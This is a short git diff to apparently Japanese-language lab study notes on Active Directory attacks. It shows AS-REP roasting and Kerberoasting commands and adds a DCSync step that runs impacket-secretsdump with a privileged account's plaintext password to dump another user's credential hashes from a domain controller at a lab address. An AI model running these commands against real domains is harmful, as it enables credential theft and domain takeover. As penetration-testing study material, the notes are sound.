@@ -32,3 +32,9 @@ impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast 
 ```
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ```
+
+6. DCSYNC攻撃をkaliからターゲットのwindowsに対して実行する。  
+-just-dc-userの引数にターゲットのユーザ名daveを、dcsyncする際に要求を送る側には権限が必要なので、その権限を持つユーザをcorp.com/jeffadminとしてる。  
+```
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
